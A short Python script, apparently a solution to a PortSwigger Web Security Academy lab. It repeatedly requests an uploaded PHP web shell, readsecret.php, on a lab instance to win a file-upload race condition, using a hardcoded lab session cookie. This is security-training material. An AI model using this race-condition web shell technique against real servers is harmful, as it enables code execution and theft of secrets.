import requests

burp0_url = "https://0ad200e60315f642c0d063b5006f0035.web-security-academy.net:443/"
burp0_cookies = {"session": "T4rn1zASg1qLKDSEmeR2lZs8x7BV2hE5"}
burp0_headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Dnt": "1", "Referer": "https://0ad200e60315f642c0d063b5006f0035.web-security-academy.net/my-account", "Upgrade-Insecure-Requests": "1", "Sec-Fetch-Dest": "document", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-User": "?1", "Sec-Gpc": "1", "Te": "trailers", "Connection": "close"}
requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies)

###########################################

# https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-race-condition

temp_url1 = burp0_url + "files/avatars/readsecret.php"
print(f"{burp0_url}\n{temp_url1}")


def loop_reading():
    while True:
        response_temp1 = requests.get(temp_url1, headers=burp0_headers, cookies=burp0_cookies, proxies={"http": "http://127.0.0.1:8080"})
        print(f"location result:{response_temp1.content}\n")

if __name__ == '__main__':
    loop_reading()